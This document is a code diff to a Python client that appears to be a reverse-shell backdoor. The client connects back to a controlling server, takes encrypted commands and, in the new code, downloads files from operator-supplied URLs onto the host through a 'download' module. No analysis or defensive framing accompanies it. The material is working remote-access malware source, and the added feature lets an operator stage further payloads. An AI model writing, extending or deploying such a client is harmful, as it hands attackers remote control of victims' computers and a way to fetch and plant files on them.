@@ -1,11 +1,17 @@
 import os
 import socket
+import requests
 import subprocess
 import time
+import shutil
 import signal
 import sys
 import struct
 from cryptography.fernet import Fernet
+
+commands = '\nAvaliable Modules\n'
+
+commands += '- download {url}\n'
 
 class Client(object):
 
@@ -82,8 +88,15 @@ class Client(object):
             data = self.socket.recv(20480)
             if data == b'':
                 break
-            data = self.Crypt.decrypt(data)
-            if data[:2].decode("utf-8") == 'cd':
+            if data == b' ':
+                self.print_output(' ')
+                break
+            try:
+                data = self.Crypt.decrypt(data)
+            except Exception as e:
+                print(e)
+                break
+            if data[:2].decode("utf-8").lower() == 'cd':
                 directory = data[3:].decode("utf-8")
                 try:
                     os.chdir(directory.strip())
@@ -91,7 +104,19 @@ class Client(object):
                     output_str = "Could not change directory: %s\n" %str(e)
                 else: 
                     output_str = ""
-            elif data[:].decode("utf-8") == 'quit':
+            elif data[:7].decode("utf-8").lower() == 'modules':
+                self.print_output(commands)
+            elif data[:8].decode("utf-8").lower() == 'download':
+                try:
+                    url = data[9:]
+                    filename = os.path.basename(url)
+                    with requests.get(url, stream=True) as r:
+                        with open(filename, 'wb') as f:
+                            shutil.copyfileobj(r.raw, f)
+                    self.print_output('Downloaded {0} successfully.'.format(filename))
+                except Exception as e:
+                    self.print_output("Error downloading file")
+            elif data[:].decode("utf-8").lower() == 'quit':
                 self.socket.close()
                 break
             elif len(data) > 0:
@@ -123,12 +148,12 @@ def main():
             time.sleep(5)     
         else:
             break    
-    try:
-        client.receive_commands()
-    except Exception as e:
-        print('Error in main: ' + str(e))
-    client.socket.close()
-    return
+    #try:
+    client.receive_commands()
+    #except Exception as e:
+    #    print('Error in main: ' + str(e))
+    #client.socket.close()
+    #return
 
 if __name__ == '__main__':
     while True:
